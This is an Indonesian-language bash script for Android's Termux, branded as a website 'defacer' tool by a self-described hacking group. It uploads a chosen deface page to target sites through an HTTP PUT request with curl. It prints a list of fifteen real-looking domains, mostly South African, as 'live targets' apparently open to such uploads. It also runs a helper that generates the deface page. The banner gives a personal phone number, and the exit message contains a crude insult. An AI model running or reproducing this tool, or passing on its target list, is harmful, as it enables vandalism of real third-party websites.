green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[31;1m"
white="\033[37;1m"
cyan="\033[36;1m"
clear
echo
echo
echo
echo
echo
echo
toilet -f standard "TxR87-Defacer" |lolcat
sleep 1
clear
echo "Wellcome To Tools Deface"|lolcat
sleep 2
clear
echo "»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»"|lolcat
echo "Author Tools : Mr.TxR87"|lolcat
echo "Version      : 1.0"|lolcat
echo "Contact      : +62 838-4822-4346"|lolcat
echo "Association  : BL4CK S3CR3T SQUAD"|lolcat
echo "Tanks To     : Mr.Jack"|lolcat
echo "«««««««««««««««««««««««««««««««««««««««««««««««"|lolcat
sleep 1
echo
echo
echo
echo "           DAFTAR TOOLS       "|lolcat
echo "###############################################"|lolcat
echo "1. DEFACE"|lolcat
echo "2. Live Target"|lolcat
echo "3. Create Script Deface"|lolcat
echo "###############################################"|lolcat
echo
echo "Pilih Nomor"|lolcat
read -p " $ " apaan
echo
if [ $apaan = "01" ] || [ $apaan = "1" ]
then
echo
echo
echo
clear
echo
echo
echo
echo
echo "Simpan SC deface Di Memory Internal Di Luar Folder "|lolcat
echo
echo "Live Target"|lolcat
echo
echo "http://contsol.co.za"|lolcat
echo "http://colourfactory.co.za"|lolcat
echo "http://chillibitez.co.za"|lolcat
echo "http://chasingfantasia.com"|lolcat
echo "http://centraltech.co.za"|lolcat
echo "http://cblandscapes.co.za"|lolcat
echo "http://crimsonmonkeyweb.com"|lolcat
echo "http://kevinbutho.com"|lolcat
echo "http://prorepafrica.com"|lolcat
echo "http://xposurephotography.co.za"|lolcat
echo "http://windmillsandporcupines.co.za"|lolcat
echo "http://tcnig.co.za"|lolcat
echo "http://techdirect.co.za"|lolcat
echo "http://thehellenic.co.za"|lolcat
echo "http://valdicare.co.za"|lolcat
echo
echo "Masukan Nama Script Deface!!!"|lolcat
echo "  ╭─Mr.TxR87"|lolcat "~/Kalo Mau Tebas Index Namai SC index.html"|lolcat
read -p " ╰─$ " script
echo
echo $white"  Masukan Target !!!!"
echo $white "╭─"$green"Mr.TxR87"|lolcat
read -p " ╰─$ " target
curl -T /storage/emulated/0/$script $target
echo $cyan"     ["$green"+"$cyan"]"$red"==="$white"＞"$green"$target"
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "02" ] || [ $apaan = "2" ]
then
echo
echo
echo
clear
echo
echo
echo
echo "Live Target"|lolcat
echo
echo "http://contsol.co.za"|lolcat
echo "http://colourfactory.co.za"|lolcat
echo "http://chillibitez.co.za"|lolcat
echo "http://chasingfantasia.com"|lolcat
echo "http://centraltech.co.za"|lolcat
echo "http://cblandscapes.co.za"|lolcat
echo "http://crimsonmonkeyweb.com"|lolcat
echo "http://kevinbutho.com"|lolcat
echo "http://prorepafrica.com"|lolcat
echo "http://xposurephotography.co.za"|lolcat
echo "http://windmillsandporcupines.co.za"|lolcat
echo "http://tcnig.co.za"|lolcat
echo "http://techdirect.co.za"|lolcat
echo "http://thehellenic.co.za"|lolcat
echo "http://valdicare.co.za"|lolcat
echo
echo "Kurang Tanya Saya Kontak saya ada di atas"|lolcat
fi
if [ $apaan = "03" ] || [ $apaan = "3" ]
then
clear
pkg install python2
chmod +x create.py
python2 create.py
mv -f index.html /storage/emulated/0/
echo $green"Nama SC index.html Cari di memory internal!!!"
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $back = "B" ] || [ $back = "b" ]
then
sh deface-TxR.sh
fi

if [ $back = "Q" ] || [ $back = "q" ]
then
echo $red " Terimakasih $kontol Sudah Menggunakan Tools Kami :) "
exit
clear
fi
